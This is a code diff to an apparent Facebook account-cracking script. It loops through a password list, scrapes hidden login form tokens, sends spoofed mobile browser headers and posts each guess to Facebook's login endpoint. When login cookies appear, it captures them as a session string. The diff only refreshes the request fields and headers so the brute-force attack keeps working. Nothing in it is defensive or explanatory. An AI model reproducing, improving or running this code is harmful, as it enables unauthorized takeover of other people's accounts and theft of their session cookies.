@@ -1049,43 +1049,33 @@ def m1(ids,pwv):
     ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
     try:
         for pas in pwv:
-            free_fb = session.get('https://free.facebook.com').text
-            info={
-            "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number": 0,
-            "unrecognized_tries": 0,
-            "email": ids,
-            "prefill_contact_point": ids,
-            "prefill_source": "browser_dropdown",
-            "prefill_type": "contact_point",
-            "first_prefill_source": "browser_dropdown",
-            "first_prefill_type": "contact_point",
-            "had_cp_prefilled": True,
-            "had_password_prefilled": False,
-            "is_smart_lock": False,
-            "bi_xrwh": 0,
-            "encpass": "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),
-            "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-            "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
+            free_fb = session.get('https://m.facebook.com/?locale2=en_GB').text
+            info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
             update={
-            'User-Agent': ua3,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
+            'Authority': 'm.facebook.com',
+            'Accept': '*/*',
+            'Accept-Language': 'es-MX,es;q=0.9',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'DPR': '2.75',
+            'Origin': 'https://m.facebook.com',
+            'Referer': 'https://m.facebook.com/?locale2=en_GB',
+            'Sec-CH-Prefers-Color-Scheme': 'light',
+            'Sec-CH-UA': '"Chromium";v="116", "Google Chrome";v="118", "Not=A?Brand";v="71"',
+            'Sec-CH-UA-Full-Version-List': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+            'Sec-CH-UA-Mobile': '?1',
+            'Sec-CH-UA-Model': '"23128PC33I"',
+            'Sec-CH-UA-Platform': 'Android',
+            'Sec-CH-UA-Platform-Version': '"8.0.0"',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
             'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-User': '?1',
-            'Sec-Fetch-Dest': 'document',
-            'Cache-Control': 'max-age=0',
-            'Referer': 'https://lm.facebook.com/',
-            'DNT': '1',
-            'Pragma': 'no-cache',
-            'TE': 'Trailers', }
-            session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data=info,headers=update).text
+            'User-Agent': 'viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .1; WOW64)LDK2WU)Applewebkit/537.36 (KHTML, like Gecko) Chrome/140.0.4699.170 Safari/537.36 Vivaldi/6.0.2979.18',
+            'Viewport-Width': '393',
+            'X-ASBD-ID': '129477',
+            'X-FB-LSD': 'AVq9MsDYu_k',
+            'X-Requested-With': 'XMLHttpRequest',
+            'X-Response-Format': 'JSONStream'}
+            session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=en_GB&refid=8',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
